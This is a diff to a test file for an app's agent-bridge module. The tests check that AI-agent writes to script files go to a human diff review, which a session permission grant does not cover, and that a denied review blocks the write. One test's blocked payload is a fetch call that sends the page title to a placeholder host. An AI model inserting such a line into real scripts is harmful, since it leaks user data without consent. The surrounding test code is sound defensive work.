@@ -7,7 +7,7 @@
  * cancellation-on-disconnect covers the same finish path.
  */
 import { describe, it, expect, vi, beforeEach } from 'vitest';
-import { start, isWritablePath } from './module.js';
+import { start, isWritablePath, isCodePath } from './module.js';
 
 class FakeWebSocket {
   static last: FakeWebSocket | null = null;
@@ -79,12 +79,21 @@ function makeContext(overrides: Record<string, unknown> = {}) {
   // world while a consent prompt sits open (the revalidation scenarios); the
   // write fakes persist into them so read-back acks verify.
   let cssContent = 'body { color: red }';
+  let domScript = 'function transformDOM(document) { return document }';
   let mp3Bytes = new Uint8Array([0, 1, 2, 0]);
   let workspaceId = 'ws-1';
   const cssFile = {
     kind: 'file' as const,
     getFile: async () => {
       const data = new TextEncoder().encode(cssContent);
+      return { size: data.length, arrayBuffer: async () => data.buffer };
+    },
+  };
+  // Mutable like the CSS, so the read-back ack on a code write verifies.
+  const domScriptFile = {
+    kind: 'file' as const,
+    getFile: async () => {
+      const data = new TextEncoder().encode(domScript);
       return { size: data.length, arrayBuffer: async () => data.buffer };
     },
   };
@@ -99,6 +108,7 @@ function makeContext(overrides: Record<string, unknown> = {}) {
   const workspace = fakeDir({
     OEBPS: fakeDir({
       Styles: fakeDir({ 'page.css': cssFile }),
+      Scripts: fakeDir({ 'clip-player.js': fakeFile('// player') }),
       'audio.mp3': mp3File,
     }),
     SOURCE: fakeDir({
@@ -109,7 +119,10 @@ function makeContext(overrides: Record<string, unknown> = {}) {
           image_template: '![<alt>](<href>)',
         })
       ),
-      scripts: fakeDir({ 'SYNTAX.md': fakeFile('# divergences: emphasis roles are swapped') }),
+      scripts: fakeDir({
+        'SYNTAX.md': fakeFile('# divergences: emphasis roles are swapped'),
+        'transformDom.js': domScriptFile,
+      }),
     }),
   });
   const statuses: Array<[string, string | undefined]> = [];
@@ -129,11 +142,14 @@ function makeContext(overrides: Record<string, unknown> = {}) {
     inspectElements: vi.fn((params: unknown) => ({ status: 'ok', echo: params })),
     writeTextFile: vi.fn(async (path: string, text: string) => {
       if (path === 'OEBPS/Styles/page.css') cssContent = text;
+      if (path === 'SOURCE/scripts/transformDom.js') domScript = text;
     }),
     writeBinaryFile: vi.fn(async (path: string, bytes: Uint8Array) => {
       if (path === 'OEBPS/audio.mp3') mp3Bytes = bytes.slice();
     }),
     isFileDirty: vi.fn(() => false),
+    reviewWrite: vi.fn(async (_request: Record<string, unknown>) => 'accept' as const),
+    diffStat: vi.fn(() => ({ added: 1, removed: 1 })),
     ...overrides,
   };
   return {
@@ -272,14 +288,16 @@ describe('agent bridge module', () => {
     const response = (await socket.receive({ id: 1, tool: 'list_files' })) as {
       result: { files: Array<{ path: string; size: number }> };
     };
-    // localeCompare: case-insensitive, so audio.mp3 sorts before Styles/
+    // localeCompare: case-insensitive, so audio.mp3 sorts before Scripts/
     expect(response.result.files.map(f => f.path)).toEqual([
       'OEBPS/audio.mp3',
+      'OEBPS/Scripts/clip-player.js',
       'OEBPS/Styles/page.css',
       'SOURCE/scripts/SYNTAX.md',
+      'SOURCE/scripts/transformDom.js',
       'SOURCE/settings.json',
     ]);
-    expect(response.result.files[1].size).toBe(19);
+    expect(response.result.files.find(f => f.path === 'OEBPS/Styles/page.css')?.size).toBe(19);
   });
 
   it('reads text files, flags binary, rejects traversal and missing paths', async () => {
@@ -399,6 +417,100 @@ describe('agent bridge module', () => {
     ]) {
       expect(isWritablePath(path), path).toBe(false);
     }
+  });
+
+  it('code paths are the ones that execute somewhere', () => {
+    for (const path of [
+      'SOURCE/scripts/transformDom.js',
+      'SOURCE/preview/head.xml',
+      'OEBPS/Scripts/clip-player.js',
+      'OEBPS/Styles/sneaky.js', // a script does not become prose by its folder
+    ]) {
+      expect(isCodePath(path), path).toBe(true);
+    }
+    for (const path of [
+      'SOURCE/text/chapter01.txt',
+      'OEBPS/Styles/page.css',
+      'OEBPS/Images/cover.jpg',
+    ]) {
+      expect(isCodePath(path), path).toBe(false);
+    }
+  });
+
+  it('a script write is reviewed as a diff, and no session grant covers it', async () => {
+    // Grant the session on a prose write first — the code write must ignore it.
+    const { ctx } = makeContext();
+    start(ctx);
+    const socket = FakeWebSocket.last!;
+    socket.open();
+    socket.onmessage?.({
+      data: JSON.stringify({
+        id: 1,
+        tool: 'write_file',
+        params: {
+          path: 'OEBPS/Styles/page.css',
+          text: 'body { color: blue }',
+          expectedHash: await sha256('body { color: red }'),
+        },
+      }),
+    });
+    await waitFor(() =>
+      [...ctx.mountEl.querySelectorAll('button')].some(b => b.textContent === 'Allow this session')
+    );
+    [...ctx.mountEl.querySelectorAll('button')]
+      .find(b => b.textContent === 'Allow this session')!
+      .click();
+    await waitFor(() => JSON.parse(socket.sent[socket.sent.length - 1]).id === 1);
+
+    socket.onmessage?.({
+      data: JSON.stringify({
+        id: 2,
+        tool: 'write_file',
+        params: {
+          path: 'SOURCE/scripts/transformDom.js',
+          text: 'function transformDOM(d) { return d }',
+          expectedHash: await sha256('function transformDOM(document) { return document }'),
+        },
+      }),
+    });
+    await waitFor(() => JSON.parse(socket.sent[socket.sent.length - 1]).id === 2);
+
+    // The app was asked to review it, with both sides of the diff in hand.
+    expect(ctx.reviewWrite).toHaveBeenCalledTimes(1);
+    expect(ctx.reviewWrite.mock.calls[0][0]).toMatchObject({
+      path: 'SOURCE/scripts/transformDom.js',
+      current: 'function transformDOM(document) { return document }',
+      incoming: 'function transformDOM(d) { return d }',
+    });
+    // ...and no second inline prompt appeared for it.
+    expect(
+      [...ctx.mountEl.querySelectorAll('button')].filter(b => b.textContent === 'Allow once')
+    ).toHaveLength(0);
+    expect(JSON.parse(socket.sent[socket.sent.length - 1])).toMatchObject({ id: 2, ok: true });
+  });
+
+  it('a denied review refuses the write', async () => {
+    const { ctx } = makeContext({
+      reviewWrite: vi.fn(async (_request: Record<string, unknown>) => 'deny' as const),
+    });
+    start(ctx);
+    const socket = FakeWebSocket.last!;
+    socket.open();
+    const before = socket.sent.length;
+    socket.onmessage?.({
+      data: JSON.stringify({
+        id: 1,
+        tool: 'write_file',
+        params: {
+          path: 'OEBPS/Scripts/clip-player.js',
+          text: 'fetch("https://example.invalid/" + document.title)',
+          expectedHash: await sha256('// player'),
+        },
+      }),
+    });
+    await waitFor(() => socket.sent.length > before);
+    expect(JSON.parse(socket.sent[socket.sent.length - 1])).toMatchObject({ ok: false });
+    expect(ctx.writeTextFile).not.toHaveBeenCalled();
   });
 
   it('writes after Allow once, through the text service path', async () => {
